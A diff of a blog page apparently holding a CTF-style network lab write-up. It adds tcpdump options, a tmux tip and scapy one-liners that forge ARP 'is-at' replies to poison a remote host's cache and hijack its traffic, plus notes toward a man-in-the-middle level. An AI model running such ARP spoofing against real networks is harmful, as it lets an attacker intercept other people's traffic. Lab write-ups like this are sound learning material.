@@ -319,7 +319,7 @@
 
 
                 <time class="article-time--reading">
-                    7 minute read
+                    8 minute read
                 </time>
                 <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
   <path stroke="none" d="M0 0h24v24H0z"/>
@@ -330,7 +330,7 @@
 
 
                 <time class="article-words">
-                    1379 字
+                    1574 字
                 </time>
             </div>
         
@@ -644,13 +644,16 @@
 </div><p>we can use the <code>tcpdump</code> here or use the <code>wireshark</code>!</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
-</span><span class="lnt">7
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
 </span></code></pre></td>
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">tcpdump -i eth0 <span class="s1">&#39;port 123&#39;</span>
@@ -660,6 +663,9 @@
 </span></span><span class="line"><span class="cl">tcpdump -A -i eth0 <span class="s1">&#39;port 123&#39;</span>
 </span></span><span class="line"><span class="cl"><span class="c1">#-A: Print each packet (minus its link level header) in ASCII.  Handy for capturing web pages.</span>
 </span></span><span class="line"><span class="cl"><span class="c1">#-i: interface</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#-l: Line-based output</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#-XX: Print out the data for each package in hexadecimal and ASCII format</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#-r: read from a file</span>
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>level6: <strong>monitor slow traffic from a remote host</strong></p>
@@ -826,9 +832,9 @@
 </span><span class="lnt">5
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">tmux
-</span></span><span class="line"><span class="cl">#ctrl+b,and c:add one terminal
-</span></span><span class="line"><span class="cl">#ctrl+b,and n:change to another terminal
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">tmux
+</span></span><span class="line"><span class="cl"><span class="c1">#ctrl+b,and c:add one terminal</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#ctrl+b,and n:change to another terminal</span>
 </span></span><span class="line"><span class="cl">tmux1:wireshark
 </span></span><span class="line"><span class="cl">tmux2:operation
 </span></span></code></pre></td></tr></table>
@@ -863,6 +869,64 @@
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>level12: <strong>manually send an Address Resolution Protocol packet.The packet should have <code>ARP op=is-at</code> and correctly inform the remote host of where the sender can be found</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">sendp<span class="o">(</span>Ether<span class="o">(</span><span class="nv">src</span><span class="o">=</span>get_if_hwaddr<span class="o">(</span><span class="s2">&#34;eth0&#34;</span><span class="o">))</span> / ARP<span class="o">(</span><span class="nv">op</span><span class="o">=</span><span class="s2">&#34;is-at&#34;</span>,hwsrc<span class="o">=</span>get_if_hwaddr<span class="o">(</span><span class="s2">&#34;eth0&#34;</span><span class="o">)</span>,psrc<span class="o">=</span><span class="s2">&#34;x.0.0.2&#34;</span>,pdst<span class="o">=</span><span class="s2">&#34;x.0.0.3&#34;</span><span class="o">)</span>,iface<span class="o">=</span><span class="s2">&#34;eth0&#34;</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#op:who-is, is-at</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#get the flag</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>level13: <strong>hijack traffic from a remote host. You do not have the capabilities of a NET ADMIN.The remote host at <code>x.0.0.4</code> is communicating with the remote host at <code>x.0.0.2</code> on port <code>123</code></strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">scapy
+</span></span><span class="line"><span class="cl">sendp<span class="o">(</span>Ether<span class="o">(</span><span class="nv">src</span><span class="o">=</span>get_if_hwaddr<span class="o">(</span><span class="s2">&#34;eth0&#34;</span><span class="o">))</span> / ARP<span class="o">(</span><span class="nv">op</span><span class="o">=</span><span class="s2">&#34;is-at&#34;</span>,hwsrc<span class="o">=</span>get_if_hwaddr<span class="o">(</span><span class="s2">&#34;eth0&#34;</span><span class="o">)</span>,psrc<span class="o">=</span><span class="s2">&#34;x.0.0.2&#34;</span>,pdst<span class="o">=</span><span class="s2">&#34;x.0.0.4&#34;</span><span class="o">)</span>,iface<span class="o">=</span><span class="s2">&#34;eth0&#34;</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#get the flag</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Process: <strong>we can see the arp cache using the command &lsquo;arp -a&rsquo; and the arp cache will update at regular intervals</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">x.0.0.4 --- who-has x.0.0.2 says x.0.0.4 ---&gt;BROADCAST
+</span></span><span class="line"><span class="cl">x.0.0.2 ---&gt; x.0.0.2 is-at aa:bb:cc:dd:ee:ff ---&gt; x.0.0.4
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">ARP CACHE
+</span></span><span class="line"><span class="cl">60s starting now: x.0.0.2 is-at aa:bb:cc:dd:ee:ff
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">x.0.0.4 --- S --&gt; x.0.0.2
+</span></span><span class="line"><span class="cl">x.0.0.2 --- SA -&gt; x.0.0.4
+</span></span><span class="line"><span class="cl">x.0.0.4 --- A --&gt; x.0.0.2
+</span></span><span class="line"><span class="cl">x.0.0.4 --- FLAG --&gt; x.0.0.2
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">We need to forge arp packets to x.0.0.4, update the arp cache
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>level14: <strong>man in the middle traffic between two remote hosts and inject extra traffic. The remote host at <code>x.0.0.4</code> is communicating with the remote host at <code>x.0.0.3</code> on port <code>123</code>.</strong></p>
+<p>trying&hellip;.</p>
 
 </section>
 
@@ -1052,7 +1116,7 @@
         
             
         
-        共 15.40k 字 · 共 7篇文章
+        共 15.60k 字 · 共 7篇文章
         <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
 
         <br />本站访客数<span id="busuanzi_value_site_uv"></span>人次---
